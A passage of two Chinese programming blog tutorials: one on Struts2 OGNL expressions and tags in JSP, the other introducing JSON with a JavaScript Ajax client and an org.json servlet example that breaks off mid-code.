                    "aplication scope");  
        %>  
    1.通过ognl表达式获取 属性范围中的值  
        <br>  
        <s:property value="#request.req" />  
        <br />  
        <s:property value="#session.sess" />  
        <br />  
        <s:property value="#application.app" />  
        <br />  
        <hr>  
    2.通过<span style="background-color: #fafafa;">ognl表达式创建list 集合 ，并且遍历出集合中的值  
        <br>  
        <s:set name="list" value="{'eeeee','ddddd','ccccc','bbbbb','aaaaa'}"></s:set>  
        <s:iterator value="#list" var="o">  
            <!-- ${o }<br/> -->  
            <s:property />  
            <br />  
        </s:iterator>  
        <br />  
        <hr>  
    3.通过ognl表达式创建Map 集合 ，并且遍历出集合中的值  
        <br>  
        <s:set name="map"  
            value="#{'1':'eeeee','2':'ddddd','3':'ccccc','4':'bbbbb','5':'aaaaa'}"></s:set>  
        <s:iterator value="#map" var="o">  
            <!--      ${o.key }->${o.value }<br/>   -->  
            <!-- <s:property value="#o.key"/>-><s:property value="#o.value"/><br/>   -->  
            <s:property value="key" />-><s:property value="value" />  
            <br />  
        </s:iterator>  
        <br />  
        <hr>  
    4.通过ognl表达式 进行逻辑判断  
        <br>  
        <s:if test="'aa' in {'aaa','bbb'}">  
            aa 在 集合{'aaa','bbb'}中；  
        </s:if>  
        <s:else>  
            aa 不在 集合{'aaa','bbb'}中；  
        </s:else>  
  
        <br />  
  
        <s:if test="#request.req not in #list">  
            不 在 集合list中；  
        </s:if>  
        <s:else>  
            在 集合list中；  
        </s:else>  
        <br />  
        <hr>  
    5.通过ognl表达式 的投影功能进行数据筛选  
        <br>  
        <s:set name="list1" value="{1,2,3,4,5}"></s:set>  
        <s:iterator value="#list1.{?#this>2}" var="o">  
            <!-- #list.{?#this>2}：在list1集合迭代的时候，从中筛选出当前迭代对象>2的集合进行显示 -->  
            ${o }<br />  
        </s:iterator>  
        <br />  
        <hr>  
    5.通过ognl表达式 访问某个类的静态方法和值  
        <br>  
        <s:property value="@java.lang.Math@floor(32.56)" />  
  
        <s:property value="@com.rao.struts2.action.OGNL1Action@aa" />  
        <br />  
        <br />  
        <hr>  
    6.ognl表达式 迭代标签 详细  
        <br>  
        <s:set name="list2"  
            value="{'aa','bb','cc','dd','ee','ff','gg','hh','ii','jj'}"></s:set>  
        <table border="1">  
            <tr>  
                <td>  
                    索引  
                </td>  
                <td>  
                    值  
                </td>  
                <td>  
                    奇？  
                </td>  
                <td>  
                    偶？  
                </td>  
                <td>  
                    首？  
                </td>  
                <td>  
                    尾？  
                </td>  
                <td>  
                    当前迭代数量  
                </td>  
            </tr>  
            <s:iterator value="#list2" var="o" status="s">  
                <tr bgcolor="<s:if test="#s.even">pink</s:if>">  
                    <td>  
                        <s:property value="#s.getIndex()" />  
                    </td>  
                    <td>  
                        <s:property />  
                    </td>  
                    <td>  
                        <s:if test="#s.odd">Y</s:if>  
                        <s:else>N</s:else>  
                    </td>  
                    <td>  
                        <s:if test="#s.even">Y</s:if>  
                        <s:else>N</s:else>  
                    </td>  
                    <td>  
                        <s:if test="#s.first">Y</s:if>  
                        <s:else>N</s:else>  
                    </td>  
                    <td>  
                        <s:if test="#s.isLast()">Y</s:if>  
                        <s:else>N</s:else>  
                    </td>  
                    <td>  
                    <s:property value="#s.getCount()"/>  
                </td>  
                </tr>  
  
            </s:iterator>  
        </table>  
        <br>  
        <hr>  
    7.ognl表达式:  if/else if/else 详细<br>  
        <% request.setAttribute("aa",0); %>  
        <s:if test="#request.aa>=0 && #request.aa<=4">  
            在0-4之间；  
        </s:if>  
        <s:elseif test="#request.aa>=4 && #request.aa<=8">  
            在4-8之间；  
        </s:elseif>  
        <s:else>  
            大于8；  
        </s:else>  
        <br>  
        <hr>  
    8.ognl表达式: url 详细<br>  
        <% request.setAttribute("aa","sss"); %>  
        <s:url action="testAction" namespace="/aa/bb">  
            <s:param name="aa" value="#request.aa"></s:param>  
            <s:param name="id">100</s:param>  
        </s:url>  
        <br/>  
        <s:set name="myurl" value="'http://www.baidu.com'"></s:set>  
        value以字符处理：   <s:url value="#myurl"></s:url><br>  
        value明确指定以ognl表达式处理:    <s:url value="%{#myurl}"></s:url>  
        <br>  
        <hr>  
    9.ognl表达式: checkboxlist 详细<br>  
        1> .list 生成；~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>  
        name:checkboxlist的名字<br>  
        list:checkboxlist要显示的列表<br>  
        value:checkboxlist默认被选中的选项,checked=checked<br>  
        <s:checkboxlist name="checkbox1" list="{'上网','看书','爬山','游泳','唱歌'}" value="{'上网','看书'}" ></s:checkboxlist>  
        <br>  
        以上生成代码：<br>  
        <xmp>  
            <input type="checkbox" name="checkbox1" value="上网" id="checkbox1-1" checked="checked"/>  
            <label for="checkbox1-1" class="checkboxLabel">上网</label>  
            <input type="checkbox" name="checkbox1" value="看书" id="checkbox1-2" checked="checked"/>  
            <label for="checkbox1-2" class="checkboxLabel">看书</label>  
            <input type="checkbox" name="checkbox1" value="爬山" id="checkbox1-3"/>  
            <label for="checkbox1-3" class="checkboxLabel">爬山</label>  
            <input type="checkbox" name="checkbox1" value="游泳" id="checkbox1-4"/>  
            <label for="checkbox1-4" class="checkboxLabel">游泳</label>  
            <input type="checkbox" name="checkbox1" value="唱歌" id="checkbox1-5"/>  
            <label for="checkbox1-5" class="checkboxLabel">唱歌</label>"  
        </xmp>  
        2> .Map 生成；~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>  
        name:checkboxlist的名字<br>  
        list:checkboxlist要显示的列表<br>  
        listKey:checkbox 的value的值<br>  
        listValue:checkbox 的lablel(显示的值)<br>  
        value:checkboxlist默认被选中的选项,checked=checked<br>  
        <s:checkboxlist name="checkbox2" list="#{1:'上网',2:'看书',3:'爬山',4:'游泳',5:'唱歌'}" listKey="key" listValue="value" value="{1,2,5}" ></s:checkboxlist>  
        <br>  
        以上生成代码：<br>  
        <xmp>  
            <input type="checkbox" name="checkbox2" value="1" id="checkbox2-1" checked="checked"/>  
            <label for="checkbox2-1" class="checkboxLabel">上网</label>  
            <input type="checkbox" name="checkbox2" value="2" id="checkbox2-2" checked="checked"/>  
            <label for="checkbox2-2" class="checkboxLabel">看书</label>  
            <input type="checkbox" name="checkbox2" value="3" id="checkbox2-3"/>  
            <label for="checkbox2-3" class="checkboxLabel">爬山</label>  
            <input type="checkbox" name="checkbox2" value="4" id="checkbox2-4"/>  
            <label for="checkbox2-4" class="checkboxLabel">游泳</label>  
            <input type="checkbox" name="checkbox2" value="5" id="checkbox2-5" checked="checked"/>  
            <label for="checkbox2-5" class="checkboxLabel">唱歌</label>  
        </xmp>  
        <hr>  
    10.ognl表达式: s:radio 详细<br>  
        <%  
            Sex sex1 = new Sex(1,"男");   
            Sex sex2 = new Sex(2,"女");  
            List<Sex> list = new ArrayList<Sex>();   
            list.add(sex1);  
            list.add(sex2);  
            request.setAttribute("sexs",list);   
        %>  
        这个与checkboxlist差不多；<br>  
        1>.如果集合为javabean：<s:radio name="sex" list="#request.sexs" listKey="id" listValue="name"></s:radio><br>  
        2>.如果集合为list：<s:radio name="sexList" list="{'男','女'}"></s:radio><br>  
        3>.如果集合为map：<s:radio name="sexMap" list="#{1:'男',2:'女'}" listKey="key" listValue="value"></s:radio><br>  
        <hr>  
    11.ognl表达式: s:select 详细<br>  
        这个与s:checkboxlist差不多；<br>  
        1>.如果集合为javabean：<s:select name="sex" list="#request.sexs" listKey="id" listValue="name"></s:select><br>  
        2>.如果集合为list：<s:select name="sexList" list="{'男','女'}"></s:select><br>  
        3>.如果集合为map：<s:select name="sexMap" list="#{1:'男',2:'女'}" listKey="key" listValue="value"></s:select><br>  
    到此主要的ognl</span>标签已经介绍完毕...由于表单标签相对简单不介绍了....  
    </body>  
</html>  
 
附上以上代码运行结果图片：见附件
 
  
 
 
 
总结OGNL的使用方法：
访问属性
名字属性获取:<s:property value="user.username"/><br>
地址属性获取:<s:property value="user.address.addr"/><br>
访问方法
调用值栈中对象的普通方法：<s:property value="user.get()"/><br>
访问静态属性和方法
调用Action中的静态方法：<s:property value="@struts.action.LoginAction@get()"/>
调用JDK中的类的静态方法：<s:property value="@java.lang.Math@floor(44.56)"/><br>
调用JDK中的类的静态方法(同上)：<s:property value="@@floor(44.56)"/><br>
调用JDK中的类的静态方法：<s:property value="@java.util.Calendar@getInstance()"/><br>
调用普通类中的静态属性：<s:property value="@struts.vo.Address@TIPS"/><br>
访问构造方法
调用普通类的构造方法:<s:property value="new struts.vo.Student('李晓红' , '美女' , 3 , 25).username"/>
 
1.5. 访问数组
获取List:<s:property value="testList"/><br>
获取List中的某一个元素(可以使用类似于数组中的下标获取List中的内容):
<s:property value="testList[0]"/><br>
获取Set:<s:property value="testSet"/><br>
获取Set中的某一个元素(Set由于没有顺序，所以不能使用下标获取数据):
<s:property value="testSet[0]"/><br> ×
获取Map:<s:property value="testMap"/><br>
获取Map中所有的键:<s:property value="testMap.keys"/><br>
获取Map中所有的值:<s:property value="testMap.values"/><br>
获取Map中的某一个元素(可以使用类似于数组中的下标获取List中的内容):
<s:property value="testMap['m1']"/><br>
获取List的大小:<s:property value="testSet.size"/><br>
 
访问集合 – 投影、选择(? ^ $)
利用选择获取List中成绩及格的对象:<s:property value="stus.{?#this.grade>=60}"/><br>
利用选择获取List中成绩及格的对象的username:
<s:property value="stus.{?#this.grade>=60}.{username}"/><br>
利用选择获取List中成绩及格的第一个对象的username:
<s:property value="stus.{?#this.grade>=60}.{username}[0]"/><br>
利用选择获取List中成绩及格的第一个对象的username:
<s:property value="stus.{^#this.grade>=60}.{username}"/><br>
利用选择获取List中成绩及格的最后一个对象的username:
<s:property value="stus.{$#this.grade>=60}.{username}"/><br>
利用选择获取List中成绩及格的第一个对象然后求大小:
<s:property value="stus.{^#this.grade>=600}.{username}.size"/><br>
集合的伪属性
OGNL能够引用集合的一些特殊的属性,这些属性并不是JavaBeans模式,例如size(),length()等等. 当表达式引用这些属性时,OGNL会调用相应的方法,这就是伪属性.
集合
伪属性
Collection(inherited by Map, List & Set)
size ,isEmpty
List
iterator
Map
keys , values
Set
iterator
Iterator
next , hasNext
Enumeration
next , hasNext , nextElement , hasMoreElements
 
 Lambda   :[…]
格式：:[…]
使用Lambda表达式计算阶乘:
<s:property value="#f = :[#this==1?1:#this*#f(#this-1)] , #f(4)"/><br>
OGNL中#的使用
#可以取出堆栈上下文中的存放的对象.
名称
作用
例子
parameters
包含当前HTTP请求参数的Map
#parameters.id[0]作用相当于
request.getParameter("id")
request
包含当前HttpServletRequest的属性（attribute)的Map
#request.userName相当于
request.getAttribute("userName")
session
包含当前HttpSession的属性（attribute）的Map
#session.userName相当于
session.getAttribute("userName")
application
包含当前应用的ServletContext的属性（attribute）的Map
#application.userName相当于
application.getAttribute("userName")
attr
用于按request > session > application顺序访问其属性（attribute）
 
 
 
 
 
 
 
 
 
 
 
 
 
 
获取Paraments对象的属性：<s:property value="#parameters.username"/>
OGNL中%的使用
用%{}可以取出存在值堆栈中的Action对象,直接调用它的方法.
例如你的Action如果继承了ActionSupport .那么在页面标签中，用%{getText('key')}的方式可以拿出国际化信息.
 OGNL中$的使用
“$”有两个主要的用途
l         用于在国际化资源文件中，引用OGNL表达式
l         在Struts 2配置文件中，引用OGNL表达式
 值栈
ValueStack对象。这个对象贯穿整个Action的生命周期（每个Action类的对象实例会拥有一个ValueStack对象）。当Struts 2接收到一个.action的请求后，会先建立Action类的对象实例，但并不会调用Action方法，而是先将Action类的相应属性放到ValueStack对象的顶层节点（ValueStack对象相当于一个栈）。
在Action中获得ValueStack对象：ActionContext.getContext().getValueStack()
l         Top语法
使用Top获取值栈中的第二个对象:<s:property value="[1].top.对象"/>
l         N语法
使用N获取值栈中的第二个对象:<s:property value="[1].对象"/>
l         @语法
调用action中的静态方法：<s:property value="@vs1@静态方法"/> vs：值栈 1：表示第一个。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JSON入门小例子, zz563143188.iteye.com.blog.1930937, Mon, 26 Aug 2013 13:42:02 +0800

 
 
企业级项目实战(带源码)地址：http://zz563143188.iteye.com/blog/1825168
收集五年的开发资料及源码下载地址：  http://pan.baidu.com/share/link?shareid=3739316113&uk=4076915866#dir/path=%2Fstudy
演示项目源码请下载codeFactory20130321,lib20130321文件,
JSON入门
 什么是JSON       
      JSON（JavaScript Object Notation http://www.json .org/json -zh.html ），是一种轻量级的基于文本且独立于语言的数据交换格式，比XML更轻巧，它是XML数据交换的一个替代方案。它源于ECMAScript程序语言标准-第3版（ECMA-262 3rd Edition - December 1999）的子集，定义了便于表示结构化数据的一套格式规范，JSON规范是符合ECMAScript语法规范，这样按JSON规范描述出的字符串已是 JavaScript的原生代码串，这使之能通过eval动态的在JSON串与JavaScript对象之间进行转换。如果夸大来说，它是另一种理想的但有别于XML数据交换语言。
 JSON建构于两种结构
        “名称/值”对的集合（A collection of name/value pairs）。不同的语言中，它被理解为对象（object），纪录（record），结构（struct），字典（dictionary），哈希表（hash table），有键列表（keyed list），或者关联数组 （associative array）。
值的有序列表（An ordered list of values）。在大部分语言中，它被理解为数组（array）。
这些都是常见的数据结构。事实上大部分现代计算机语言都以某种形式支持它们。这使得一种数据格式在同样基于这些结构的编程语言之间交换成为可能。
 JSON语法规则
        对象是一个无序的“‘名称/值’对”集合。一个对象以“{”（左括号）开始，“}”（右括号）结束。每个“名称”后跟一个“:”（冒号）；“‘名称/值’ 对”之间使用“,”（逗号）分隔。
        数组是值（value）的有序集合。一个数组以“[”（左中括号）开始，“]”（右中括号）结束。值之间使用“,”（逗号）分隔。
        值（value）可以是双引号括起来的字符串（string）、数值(number)、true、false、 null、对象（object）或者数组（array）。这些结构可以嵌套。
         字符串（string）是由双引号包围的任意数量Unicode字符的集合，使用反斜线转义。一个字符（character）即一个单独的字符串（character string）。与C或者Java的字符串非常相似。
 快速浏览JSON与XML表现形式
         假如有一个employee对象，它有“姓、名、员工编号、头衔”等信息，先看看JSON是如何来描述它的：
Js代码  
{  
    employee :  
    {  
        firstName: "John",  
        lastName : "Doe",  
        employeeNumber : 123,  
        title : "Accountant"  
    }  
}   
       再来看看XML是如何表示的，请看：
Xml代码  
<employee>  
    <firstName>John</firstName>  
    <lastName>Doe</lastName>  
    <employeeNumber>123</employeeNumber>  
    <title>Accountant</title>  
</employee>   
      从上面描述看，JSON表示法不正是JavaScript中对象描述的一种方式么？正确，这正是JavaScript中的对象构造的原生代码。既然是原生代码，我们把它转换成JavaScript中的对象，这样我们操作对象就比操作字符串方便多了。       把JSON字符串转换成JavaScript对象：
Js代码  
<script type="text/javascript">  
        //使用script本身的函数eval将JSON串解析成对象  
    var e = eval(  
                    '({' +  
                    'employee : ' +  
                    '{' +  
                        'firstName: "John",' +  
                        'lastName : "Doe",' +  
                        'employeeNumber : 123,' +  
                        'title : "Accountant"' +  
                    '}' +  
                    '})'  
                );  
        //现在我们可以使用e这个对象了，还可以以点的访问形式来访问对象的属性  
    alert(e.employee.firstName);  
    alert(e.employee.lastName);  
    alert(e.employee.employeeNumber);  
    alert(e.employee.title);  
</script>   
      看完上述后我们来对比它们。
 
 XML与JSON比对
       经过一番快速浏览后如何？感觉到没有JSON的设计上比XML更轻巧简洁？先前就说过了，正是它符合JavaScript语言对象本身特点，这使得如果服务器传来的文本是符合JavaScript语法定义语句的字符串，那岂不是一条eval方法就能解析了？的确如此~
       从上面两者的表示来看，JSON表示法在语法上要比XML要简洁的多，由于不需要使用关闭标签来呼应开始标签，因此许多多余的信息不再出现了，相对XML而言基本上不存在数据冗余，这在传输与响应速度上大在提高了。
       另外，JSON不只是在表现形式上有如此的优势，最重要的是可以丢弃以前弄得我们晕头转向的DOM解析了(客户端的JavaScript的XML DOM解析，服务器端的DOM、SAX、Dom4j、Jdom等)。JSON与XML相比对JavaScript有着更好的通用性，一段JSON格式数据经过JavaScript一个简单的方法(eval)即可转换成 JavaScript对象供程序调用，转换方法是浏览器的JavaScript内部定义好的无需再手工编写。而一段XML格式的数据需要调用浏览器内部的 XML解析器工具进行解析后才可以使用。而对于不同内核的浏览器（如IE、Netscape等）XML解析的方法是有差别的，因此需要针对不同浏览器内核做不同的方法封装，从而给客户端开发带来一定的复杂度。相比之下JSON被浏览器解析的速度更快。在服务器端不同的语言也有不同的JSON解析器，可以很方便的解析客户端传过来的字符串，而不像为了读取XML还是借助于这样或那样的API工具。
 JSON优缺点
优点：
　　乍看上去，使用JSON的数据分隔符的优点可能并不那么明显，但存在一个根本性的缘由：它们简化了数据访问。使用这些数据分隔符时， JavaScript引擎对数据结构（如字符串、数组、对象）的内部表示恰好与这些符号相同。
　　JSON的另一个优点是它的非冗长性。在XML中，打开和关闭标记是必需的，这样才能满足标记的依从性；而在JSON中，所有这些要求只需通过一个简单的括号即可满足。在包含有数以百计字段的数据交换中，传统的XML标记将会延长数据交换时间
　　此外，JSON受到了擅长不同编程语言的开发人员的青睐。这是因为无论在Haskell中或 Lisp中，还是在更为主流的C#和Java中，开发都可以方便地生成JSON。
 
不足：
　　和许多好东西都具有两面性一样，JSON的非冗长性也不例外，为此JSON丢失了XML具有的一些特性。命名空间允许不同上下文中的相同的信息段彼此混合，然而，显然在JSON中已经找不到了命名空间。JSON与XML的另一个差别是属性的差异，由于JSON采用冒号赋值，这将导致当XML转化为 JSON时，在标识符（XML CDATA）与实际属性值之间很难区分谁应该被当作文本考虑。 　　另外，JSON片段的创建和验证过程比一般的XML稍显复杂。从这一点来看，XML在开发工具方面领先于JSON。
JSON实践
预备知识
 动态脚本函数eval ()
      在进一步学习之前，我们有必要讲解一下eval方法的用法，懂的同学可以跳过。
 
      eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。它接收一个参数s，如果s不是字符串，则直接返回s。否则执行s语句。如果s语句执行结果是一个值，则直接返回此值，否则返回undefined。
 
      另外，该方法只接受原始字符串作为参数，如果 string 参数不是原始字符串，那么该方法将不作任何改变地返回。因此请不要为 eval() 函数传递 String 对象来作为参数：
Js代码  
var str = new String("alert('msg')");  
//请不要传递String对象，否则直接返回string对象了  
alert(eval(str)==str);//true  
  
//应该传递原始string字符串，这样才看作JavaScript脚本并执行   
eval("alert('msg')");//msg  
      最后，需要特别注意的是对象声明语法“{}”并不能返回一个值，需要用括号括起来才会返回值(括号里的脚本是表达式，有返回值，而不是无返回值的逻辑式，因为大括号里的脚本又可能是表达式，又可能是普通的逻辑表达，所以用小括号括起来后明确的说明是值表达式)：
Js代码  
var str="{}";//花括号内没属性时  
alert(eval('(' + str + ')'));//弹出：[object Object]  
alert(eval(str));//弹出：undefined  
  
str="{name:'jzj'}";//花括号内有一个属性  
alert(typeof eval('(' + str + ')'));//弹出：object，以对象方式返回  
alert(eval(str));//弹出：jzj  
alert(eval('(' + str + ')').name);//弹出：jzj  
alert(eval(str).name);//弹出：undefined  
  
str="{name:'jzj',age:30}";//花括号内有多个属性时  
alert(eval('(' + str + ')'));//  
alert(eval('(' + str + ')').name);//jzj  
alert(eval('(' + str + ')').age);//30  
//alert(eval(str));//运行时会出错，多个属性时不用小括号运行出错  
      可以看到，对于对象声明语句来说，仅仅是执行，并不能返回值 。为了返回常用的“{}”这样的对象声明语句，必须用括号括住，以将其转换为表达式，才能返回其值 。这也是使用JSON来进行Ajax开发的基本原理之一。
 
     现来说说本节的重点，就是在应用eval时，动态脚本所生成的变量都局部的，但很多时候我们可能在调用eval函数的外面使用生成的变量，eval不可能在全局空间内执行，这就给开发带来了不少问题，这该如何作？请看继续往下看吧。
 
     我们先来证实一下eval产生的变量是局部性的，在调用eval函数外是不能访问到此变量的。
Js代码  
var str='全局';//定义一个全局变量  
function test(){  
    eval('var str="局部"');  
    alert(str);//局部  
}  
test();  
alert(str);    //弹出：全局  
   另外，eval生成的函数也是局部的，它只能在生成它的函数内使用，出函数域就不能调用的到。
 
      解决办法:
Js代码  
function gloablEval(code){  
    if(window.attachEvent && !window.opera){  
      //ie  
      execScript(code);   
    }else{  
      //not ie window对象不能省，否则生成的变量在执行的函数外不可见  
      window.eval(code);  
      alert(str);//局部  
      //eval(code);  
      //alert(str);//局部  
    }  
}  
var str='全局';//定义一个全局变量  
gloablEval('var str="局部"');  
alert(str);    //弹出：局部，这里用局部的履盖了全局变量的值  
       现解释一下：
      1、对于IE浏览器，默认已经提供了这样的函数：execScript，用于在全局空间执行代码。      2、对于Firefox浏览器，直接调用eval函数，则在调用者的空间执行；如果调用window.eval则在全局空间执行。
 JavaScript中的JSON
       我们知道，可以使用eval()方法调用JavaScript的编译器把JSON文本转变成对象。因为JSON是JavaScript的一个确切的子集，编译器可以正确地解析JSON文本，然后生成一个对象结构。
Js代码  
var myObject = eval('(' + myJSONtext + ')');  
 
      eval函数非常快速。它可以编译执行任何JavaScript程序，因此产生了安全性问题。当使用可信任与完善的源代码时才可以使用eval函数。这样可以更安全的使用JSON解析器。使用XMLHttpRequest的web应用，页面之间的通讯只允许同源，因此是可以信任的。但这却不是完善的。如果服务器没有严谨的JSON编码，或者没有严格的输入验证，那么可能传送包括危险脚本的无效JSON文本。eval函数将执行恶意的脚本。      如果关心安全的话，使用JSON解析器可以防止此类事件。JSON解析器只能辨识JSON文本，拒绝所有脚本，因此它比较安全，JSON官方网站提供的一个开源的JSON解析器和字符串转换器(http://www.json.org/json.js )。
Js代码  
var myObject = myJSONtext.parseJSON();  
      而JSON的字符串转换器（stringifier）则作相反的工作，它将JavaScript数据结构转换为JSON文本。JSON是不支持循环数据结构的，所以注意不能把循环的结构交给字符串转换器。
Js代码  
var myJSONText = myObject.toJSONString();  
   Java中的JSON
      Java中的JSON解释器官方提供了好几种，我们这里使用的是org.json 包，关于如何使用，请参见另一篇《JSON之org.json包测试》 ，它是基于官方包提供的测试改写而来的。
开始实战
       本实例实现了客户端与服务器端通过JSON进行参数的传递与接收，而不是通过原来的XML方式进行通信。页面采用了Prototype的Ajax方式进行异步通信，并采用了官方json.js 进行对象与JSON串的灵活互转。服务器端采用了官方提供org.json 包进行JSON串与Java对象的互转。具体的细节请看代码注释。
       客户端实现：
页面代码清单代码  
<html>   
<head>   
<title> JSON Address Book </title>   
  
</head>  
<body>   
<div style="text-align:left" id="addressBookResults"></div>  
  
<script type="text/javascript" src="prototype-1.4.0.js"></script>   
<script type="text/javascript" src="json.js"></script>   
<script type="text/javascript">  
//address对象  
function address(city,street,zip){  
    this.city = city;//城市  
    this.street = street;//街道  
    this.zip = zip;//邮编  
}  
//addressbook对象  
function addressbook(city,street,zip,name,tel1,tel2){  
    //addressbook对象中含有address对象属性  
    this.address = new address(city,street,zip);  
    //人的名字属性  
    this.name = name;  
    //人的电话号码属性，且有两个电话号码  
    this.phoneNumbers = [tel1,tel2];  
}  
//创建两个addressbook对象实例，这些信在实际的项目中是由用户通过页面输入的  
var addressbookObj1 = new addressbook("Seattle, WA","P.O BOX 54534",  
                                        42452,"Ann Michaels",  
                                        "561-832-3180","531-133-9098");  
var addressbookObj2 = new addressbook("Miami, FL","53 Mullholand Drive",  
                                        72452,"Betty Carter",  
                                        "541-322-1723","546-338-1100");  
  
//创建要传递给后台的参数对象  
var paramObj={};  
//因为有多个(这里是两个)，我们用数组的形式  
paramObj.addressbook=new Array(addressbookObj1,addressbookObj2);  
  
//通过对象实例的toJSONString方法，JavaScript对象转JSON串  
var param = paramObj.toJSONString();  
//alert(param);  
  
// 定义 service URL   
var url = '/json_addressbook/addrbk?timeStamp='+new Date();  
  
// 通过原型创建AJAX请求的WEB服务, 响应后, 回调 showResponse 方式        
new Ajax.Request( url, { method: 'post', parameters:"jsonStr="+param,   
                            onComplete: callBack });  
  
// 回调方法，接收服务器返回过来的JSON串，  
//并用eval函数或String对象实例parseJSON转换成JavaScript对象  
function callBack(originalRequest)  {  
    // 获取服务器返回的JSON原始串   
    var jsonRaw = originalRequest.responseText;  
    //原始串转换成JavaScript对象  
    //var jsonRawObj = eval("(" + jsonRaw + ")");用此种方式也行  
    var jsonRawObj = jsonRaw.parseJSON();  
      
    //从json原始对象中提取HTML格式串  
    var jsonHtmlStr = jsonRawObj.jsonHtmlStr;  
    //提取AddreeBook的JSON串  
    var jsonCode = jsonRawObj.jsonCode;  
    // 通过eval动态的把JSON响应串构造成JavaScript对象  
    //var jsonContent = jsonCode.parseJSON();用此种方式也行  
    jsonContent = eval("(" + jsonCode + ")");     
      
    // 从服务器获取的JSON格式串后，显示数据到页面      
    finalResponse = "<b>服务器返回的JSON串如下： </b><br/><br>";  
    finalResponse +=  jsonHtmlStr+"<br/>";  
    finalResponse +=  "<br><b>从JSON对象提取信息如下： </b><br/><br>";  
    // 根据地址薄长度循环.  
    for (i = 0; i < jsonContent.addressbook.length; i++) {  
         finalResponse += "<hr/>";  
         finalResponse += "<i>Name:</i> " + jsonContent.addressbook[i].name + "<br/>";     
         finalResponse += "<i>Address:</i> " + jsonContent.addressbook[i].address.street   
                            + " -- " +   
                           jsonContent.addressbook[i].address.city[0] + "," +             
                           jsonContent.addressbook[i].address.zip + ".<br/>";            
         finalResponse += "<i>Telephone numbers:</i> "   
                        + jsonContent.addressbook[i].phoneNumbers[0] + " &amp; " +   
         jsonContent.addressbook[i].phoneNumbers[1] + ".";            
    }  
    // 把结果置换到结果区域并显示  
    document.getElementById("addressBookResults").innerHTML = finalResponse;  
}  
</script>   
</body>   
</html>   
         页面展示结果：
  JSON Address Book
服务器返回的JSON串如下： {"addressbook": [    {        "address": {            "city": [                "Seattle, WA",                "changsha"            ],            "street": ["P.O BOX 54534"],            "zip": [42452]        },        "name": "Ann Michaels",        "phoneNumbers": [            "561-832-3180",            "531-133-9098"        ]    },    {        "address": {            "city": [                "Miami, FL",                "changsha"            ],            "street": ["53 Mullholand Drive"],            "zip": [72452]        },        "name": "Betty Carter",        "phoneNumbers": [            "541-322-1723",            "546-338-1100"        ]    }]}从JSON对象提取信息如下： 
Name: Ann MichaelsAddress: P.O BOX 54534 -- Seattle, WA,42452.Telephone numbers: 561-832-3180 & 531-133-9098.
Name: Betty CarterAddress: 53 Mullholand Drive -- Miami, FL,72452.Telephone numbers: 541-322-1723 & 546-338-1100.
          服务器端实现：
Java代码  
package orgjson;  
  
import java.io.IOException;  
import java.util.Iterator;  
import java.util.Map;  
import java.util.SortedMap;  
import java.util.TreeMap;  
  
import javax.servlet.ServletException;  
import javax.servlet.http.HttpServlet;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
  
import org.json.JSONArray;  
import org.json.JSONException;  
import org.json.JSONObject;  
  
import bean.Address;  
  
/** 
 * 使用 org.josn 包进行解析操作 
 * (C) 2009-9-1, jzjleo   
 */  
public class AddressServlet extends HttpServlet {  
  
    private static final long serialVersionUID = -1762985503942785440L;  
  
    protected void service(HttpServletRequest req, HttpServletResponse resp)  
            throws ServletException, IOException {  
        // 创建addressbook数据结构  
        SortedMap addressBook = new TreeMap();  
  
        // 创建新的address实体并放置到Map中  
        Address annMichaels = new Address("P.O BOX 54534", "Seattle, WA", 42452,  
                "561-832-3180", "531-133-9098");  
        addressBook.put("Ann Michaels", annMichaels);  
  
        Address bettyCarter = new Address("53 Mullholand Drive", "Miami, FL", 72452,  
                "541-322-1723", "546-338-1100");  
        addressBook.put("Betty Carter", bettyCarter);  
  
        try {  
  
            // 准备转换通讯簿映射到JSON数组   
            // 数组用于放置多个地址条目  
            JSONArray jsonAddressBook = new JSONArray();  
  
            // 迭代过滤地址簿条目  
            for (Iterator iter = addressBook.entrySet().iterator(); iter.hasNext();) {  
  
                // 找当前迭代项   
                Map.Entry entry = (Map.Entry) iter.next();  
                String key = (String) entry.getKey();  
                Address addressValue = (Address) entry.getValue();  
  
                // 以键值对的形式存入条目并分配给"name"  
                JSONObject jsonResult = new JSONObject();  
                jsonResult.put("name", key);  
  
                // 获取和创造相应的地址结构，綁定到新Key  
                // 追加地址条目到JSON格式结果   
                String streetText = addressValue.getStreet();  
                String cityText = addressValue.getCity();  
                int zipText = addressValue.getZip();  
  
                //--注：Bean可以直接转换成JSON串，下面可以采用 new JSONObject(addressValue)  
                //形式来自动转换成JSON串  
                JSONObject jsonAddrObj = new JSONObject();  
  
                //以数组的形式存放，street为存放数组的变量名即Key，如果key不存在，则新建，如果存在， 
                //则在原来数组后追加  
                  
                //jsonAddress.append("street", streetText);  
                //上句等价于下面语句   
                jsonAddrObj.put("street", new JSONArray().put(streetText));  
                jsonAddrObj.append("city", cityText);  
                jsonAddrObj.append("city", "changsha");//追加  
                //上两句等价于如下语句  
                //jsonAddrObj.put("city", new  JSONArray().put(cityText).put("changsha")); 
                jsonAddrObj.append("zip", new Integer(zipText));  
                jsonResult.put("address", jsonAddrObj);  
  
                // 获取和结构，建立相应的电话到新的Key   
                // 追加在电话条目到JSON格式的结果里  
                String telText = addressValue.getTel();  
                String telTwoText = addressValue.getTelTwo();  
                JSONArray jsonTelephones = new JSONArray();  
                jsonTelephones.put(telText);  
                jsonTelephones.put(telTwoText);  
                jsonResult.put("phoneNumbers", jsonTelephones);  
  
                // 把JSON地址条目放置到全局的JSON地址薄数组里  
                jsonAddressBook.put(jsonResult);  
            } // 结束循环地址薄   
  
            // 赋值JSON地址薄到结果字符变量   
            JSONObject resultJsonObj = new JSONObject().put("addressbook",  
                    jsonAddressBook);  
  
            //格式化输出到页面上的JSON串  
            String jsonHtmlStr = resultJsonObj.toString(4).replaceAll(" ", "&nbsp;")  
                    .replaceAll("\n", "<br>");  
  
            JSONObject jsonObj = new JSONObject().put("jsonHtmlStr", jsonHtmlStr).put(  
                    "jsonCode", resultJsonObj.toString());  
            // 返回JSON串  
            resp.getOutputStream().write(jsonObj.toString().getBytes());  
  
            System.out.println(resultJsonObj.toString(4));  
